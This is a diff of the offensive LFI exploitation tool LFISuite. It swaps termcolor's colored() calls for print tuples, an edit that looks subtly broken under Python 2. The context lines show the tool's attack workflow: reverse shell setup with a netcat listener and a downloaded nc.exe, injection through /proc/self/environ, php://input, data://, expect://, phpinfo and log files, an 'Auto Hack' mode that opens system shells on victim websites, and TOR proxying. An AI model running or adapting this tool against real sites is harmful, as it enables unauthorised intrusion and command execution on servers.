@@ -61,12 +61,6 @@ except:
 import threading
 from random import randint
 
-try:
-	from termcolor import colored
-except:
-	solve_dependencies("termcolor")
-	from termcolor import colored
-
 netcat_url = "https://github.com/D35m0nd142/LFISuite/raw/master/nc.exe"
 LFS_VERSION = '1.13' # DO NOT MODIFY THIS FOR ANY REASON!!
 
@@ -118,7 +112,7 @@ def windows_reverse_shell():
 	global reverseConn
 
 	if("?" in reverseConn):
-		print colored("[WARNING] Make sure to have your netcat listening ('nc -lvp port') before going ahead.","red")
+		print ("[WARNING] Make sure to have your netcat listening ('nc -lvp port') before going ahead.","red")
 		time.sleep(2)
 		ipBack   = raw_input("\n[*] Enter the IP address to connect back to -> ")
 		portBack = raw_input("[*] Enter the port to connect to [default: 12340] -> ")
@@ -130,7 +124,7 @@ def generic_reverse_shell():
 	global reverseConn
 
 	if("?" in reverseConn):
-		print colored("[WARNING] Make sure to have your netcat listening ('nc -lvp port') before going ahead.","red")
+		print ("[WARNING] Make sure to have your netcat listening ('nc -lvp port') before going ahead.","red")
 		time.sleep(2)
 		ipBack   = raw_input("\n[*] Enter the IP address to connect back to -> ")
 		portBack = "notValidPort"
@@ -147,7 +141,7 @@ def checkIfReverseShell(cmd):
 
 def checkIfWindows(path):
 	if(victimOs == "Windows" or (len(path) > 0 and "\windows\system32" in path.lower())): 
-		print colored("\n[+] OS: Windows\n","white")
+		print ("\n[+] OS: Windows\n","white")
 		return True
 	return False
 # ----------------------------------------------------#
@@ -212,7 +206,7 @@ def check_for_update():
 			updated = True
 			print "[+] New LFISuite version found. Updating.."
 			download(lfisuite_github_url,sys.argv[0])
-			print colored("\n[+] LFISuite updated to version %s" %currversion,"red")
+			print ("\n[+] LFISuite updated to version %s" %currversion,"red")
 			print "[i] Visit https://github.com/D35m0nd142/LFISuite/blob/master/CHANGELOG.md for details"
 			time.sleep(2)
 			os.system("%s %s" %(sys.executable,sys.argv[0]))
@@ -234,9 +228,9 @@ class NoURLEncodingSession(requests.Session):
 
 def printChoice(choice):
 	if("Auto Hack" in choice):
-		print colored("\n.:: %s ::.\n" %choice, "red")
+		print ("\n.:: %s ::.\n" %choice, "red")
 	else:
-		print colored("\n.:: %s Injection ::.\n" %choice, "red")
+		print ("\n.:: %s Injection ::.\n" %choice, "red")
 
 def extractWebsiteFromUrl(url):
 	# Pre: url contains http:// or https:// declaration
@@ -349,10 +343,10 @@ def generateRandom():
 	return "AbracadabrA%s" %randint(40,999999)
 
 def onlyPhpPrint():
-	print colored("[system() calls have been disabled by the website, you can just run php commands (ex: fwrite(fopen('a.txt','w'),\"content\");]\n","red")
+	print ("[system() calls have been disabled by the website, you can just run php commands (ex: fwrite(fopen('a.txt','w'),\"content\");]\n","red")
 
 def invalidChoice():
- 	print colored("\n[Error] You entered an invalid choice!\n","red")
+ 	print ("\n[Error] You entered an invalid choice!\n","red")
 	
 def exit():
 	print "\nBye ;-)\n"
@@ -521,8 +515,8 @@ def hackSE(par):
 	output = execSeCmd("id")
 
 	if("uid=" in output or "gid=" in output or "Usage of id by" in output):
-		print colored("\n[+] LFI Worked! :-)","red")
-		print colored("[*] Opening a system shell...\n","white")
+		print ("\n[+] LFI Worked! :-)","red")
+		print ("[*] Opening a system shell...\n","white")
 
 		whoami = cleanOutput(execSeCmd("whoami"), True)
 		pwd = cleanOutput(execSeCmd("pwd"), True)
@@ -547,10 +541,10 @@ def hackSE(par):
 			rand_str = generateRandom()
 			output = execSeCmd("echo %s;" %rand_str)
 			if(rand_str in output and ("echo %s" %rand_str) not in output and ("echo%%20%s" %rand_str) not in output):
-				print colored("\n[+] LFI Worked! :-)","red")
-				print colored("[*] Opening a shell...","white")
+				print ("\n[+] LFI Worked! :-)","red")
+				print ("[*] Opening a shell...","white")
 				onlyPhpPrint()
-				print colored("[WARNING] All occurences of \" will be replaced with '.\n","white")
+				print ("[WARNING] All occurences of \" will be replaced with '.\n","white")
 				cmd = ""
 				whoami = isUnknown(execSeCmd("get_current_user();"))
 				pwd = isUnknown(execSeCmd("getcwd();"))
@@ -596,7 +590,7 @@ def run_self_environ():
 	else:
 		for i in range(0,7):
 			restoreVars()
-			print colored("\n[*] Trying to inject '%s'" %se_header_pars[i],"white")
+			print ("\n[*] Trying to inject '%s'" %se_header_pars[i],"white")
 			if(i == 6):
 				setHttpCookie()
 			hackSE(se_header_pars[i])
@@ -728,9 +722,9 @@ def run_phpinfo():
 	found = phpinfo_request(headers,cmd,lfipath,phpinfopath,1,host)
 
 	if(len(found) > 0 and rand_str in found):
-	    print colored("\n[+] The website seems to be vulnerable. Opening a system Shell..","white")
+	    print ("\n[+] The website seems to be vulnerable. Opening a system Shell..","white")
 	    time.sleep(0.5)
-	    print colored("[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n","red")
+	    print ("[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n","red")
 
 	    whoami = isUnknown(cleanOutput(phpinfo_request(headers,"whoami",lfipath,phpinfopath,0,host), True).replace(" ",""))
 	    pwd = isUnknown(cleanOutput(phpinfo_request(headers,"pwd",lfipath,phpinfopath,0,host), True).replace(" ", ""))
@@ -759,7 +753,7 @@ def run_phpinfo():
 		rand_str = generateRandom()
 		found = phpinfo_request(headers,"php://echo %s" %rand_str,lfipath,phpinfopath,1,host)
 		if(rand_str in found):
-			print colored("\n[+] The website seems to be vulnerable. Opening a Shell..","white")
+			print ("\n[+] The website seems to be vulnerable. Opening a Shell..","white")
 			time.sleep(0.5)
 			onlyPhpPrint()
 
@@ -968,7 +962,7 @@ def simpleGETorHEAD(keyword, ologurl, logmain):
 		r = requests.get(ologurl,headers=gen_headers,timeout=15, verify=False)
 
 	resp = r.text
-	print colored("\nTrying to inject the website using simple %s requests." %keyword, "white")
+	print ("\nTrying to inject the website using simple %s requests." %keyword, "white")
 
 	if(access_control(resp,keyword,randStr)):
 		print "[+] The website seems to be vulnerable. Opening a System Shell..\n"
@@ -1079,7 +1073,7 @@ def send_passthru_cmd(ologurl,cmd,start_get):
 def GetPassthru(ologurl, logmain):
 	global victimOs
 
-	print colored("\nTrying to inject the website using GET 'passthru' requests.", "white")
+	print ("\nTrying to inject the website using GET 'passthru' requests.", "white")
 	rand_str = generateRandom()
 	url = "%s&cmd=echo %s" %(ologurl,rand_str)
 	resp = (requests.get(url,headers=gen_headers,timeout=20, verify=False)).text
@@ -1245,7 +1239,7 @@ def run_phpinput():
 			if(checkIfWindows(path)):
 				victimOs = "Windows"
 
-		print colored("[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n","red")
+		print ("[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n","red")
 		whoami = isUnknown(cleanOutput(extract_phpinput_res(send_phpinput_cmd("whoami",inputurl)), True))
 		if(victimOs != "Windows"):
 			pwd = cleanOutput(extract_phpinput_res(send_phpinput_cmd("pwd",inputurl)), True)
@@ -1404,7 +1398,7 @@ def run_data():
 		if(sys_disabled):
 			onlyPhpPrint()
 		else:
-			print colored("[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n","red")
+			print ("[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n","red")
 		time.sleep(1)
 
 		inputmain = removeHttpFromWebsite(extractWebsiteFromUrl(odataurl))
@@ -1628,7 +1622,7 @@ def scanner():
 	global ahgen
 	global ahcnf
 
-	print colored("\n.:: LFI Scanner ::.\n", "white")
+	print ("\n.:: LFI Scanner ::.\n", "white")
 	fname = raw_input("[*] Enter the name of the file containing the paths to test [default: 'pathtotest.txt'] -> ")
 	if(len(fname) == 0):
 		fname = "pathtotest.txt"
@@ -1672,7 +1666,7 @@ def scanner():
 	            or ("[error] [client" in content and "File does not exist:" in content and "proc/self/fd/" in website)
 	            or ("State: R (running)" in content and ("Tgid:" in content or "TracerPid:" in content or "Uid:" in content)
 	            	and "/proc/self/status" in website))):
-	            print colored("[+] '%s' [Vulnerable]" %website, "red")
+	            print ("[+] '%s' [Vulnerable]" %website, "red")
 	            #print "main() [<a href='function.include'>function.include</a>" not in content
 	            #print "\n------------------------------\n%s\n\n" %content
 
@@ -1693,7 +1687,7 @@ def scanner():
 	    else:
 	        print "[!] Problem connecting to the website.\n"
 
-	print colored("\n[+] Retrieved %s interesting paths.\n" %len(ahpaths),"white")
+	print ("\n[+] Retrieved %s interesting paths.\n" %len(ahpaths),"white")
 	time.sleep(0.5)
 
 	showInterestingPath("Logs",ahlogs)
@@ -1732,13 +1726,13 @@ def run_autoHack():
 	# /proc/self/environ Exploitation
 	if(len(ahenv) > 0):
 		for env in ahenv:
-			print colored("\n[*] Trying to exploit /proc/self/environ on '%s'.." %env, "yellow")
+			print ("\n[*] Trying to exploit /proc/self/environ on '%s'.." %env, "yellow")
 			ahenvurl = env
 			run_self_environ()
 
 	time.sleep(1)
 	# php://input Exploitation
-	print colored("\n[*] Trying to exploit php://input wrapper on '%s'.." %ahurl, "yellow")
+	print ("\n[*] Trying to exploit php://input wrapper on '%s'.." %ahurl, "yellow")
 	run_phpinput()
 
 	time.sleep(1)
@@ -1746,7 +1740,7 @@ def run_autoHack():
 	if(len(ahlogs) > 0):
 		for log in ahlogs:
 			if("access" in log):
-				print colored("\n[*] Trying to exploit access logs' file on '%s'.." %log, "yellow")
+				print ("\n[*] Trying to exploit access logs' file on '%s'.." %log, "yellow")
 				ahlogurl = log
 				run_access_log()
 
@@ -1755,23 +1749,23 @@ def run_autoHack():
 	if(len(ahfd) > 0):
 		ahfd_errPage = raw_input("[*] Enter a page to request which will produce an error visible in your /proc/self/fd logs (ex: 'http://site/robots.txt') -> ")
 		for fd in ahfd:
-			print colored("\n[*] Trying to exploit /proc/self/fd on '%s'.." %fd, "yellow")
+			print ("\n[*] Trying to exploit /proc/self/fd on '%s'.." %fd, "yellow")
 			ahfdurl = fd
 			run_self_fd()
 
 	time.sleep(1)
 	# data:// Exploitation
-	print colored("\n[*] Trying to exploit data:// wrapper on '%s'.." %ahurl, "yellow")
+	print ("\n[*] Trying to exploit data:// wrapper on '%s'.." %ahurl, "yellow")
 	run_data()
 
 	time.sleep(1)
 	# expect:// Exploitation
-	print colored("\n[*] Trying to exploit expect:// wrapper on '%s'.." %ahurl, "yellow")
+	print ("\n[*] Trying to exploit expect:// wrapper on '%s'.." %ahurl, "yellow")
 	run_expect()
 
 	time.sleep(1)
 	# phpinfo Exploitation
-	print colored("\n[*] Trying to exploit phpinfo through '%s'.." %ahurl, "yellow")
+	print ("\n[*] Trying to exploit phpinfo through '%s'.." %ahurl, "yellow")
 	ahwebsite = extractWebsiteFromUrl(ahurl)
 	ahpath = extractPathFromUrl(ahurl)
 
@@ -1782,7 +1776,7 @@ def run_autoHack():
 
 	time.sleep(1)
 	# php://filter Exploitation
-	print colored("\n[*] Trying to get some pages' content using php://filter on '%s'.." %ahurl, "yellow")
+	print ("\n[*] Trying to get some pages' content using php://filter on '%s'.." %ahurl, "yellow")
 	run_phpfilter()
 
 #----------------------------------------------------------------------------------------------------------------------------------------#
@@ -1822,7 +1816,7 @@ while(validChoice is False):
 
 			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, tor_addr, int(tor_port))
 			socket.socket = socks.socksocket
-			print colored("[+] TOR proxy active on socks5://%s:%s" %(tor_addr,tor_port),"red")
+			print ("[+] TOR proxy active on socks5://%s:%s" %(tor_addr,tor_port),"red")
 			time.sleep(0.5)
 
 		if(choice == "2" or choice == "b"):
@@ -1830,7 +1824,7 @@ while(validChoice is False):
 		elif(choice == "1" or choice == "a"):
 			echoice = "11"
 			while((echoice < 1 or echoice > 10) and echoice != "x"):
-				print colored("\n.:: LFI Exploiter ::.\n", "white")
+				print ("\n.:: LFI Exploiter ::.\n", "white")
 				print "____________________________\n"
 				print "    Available Injections    "
 				print "____________________________\n"
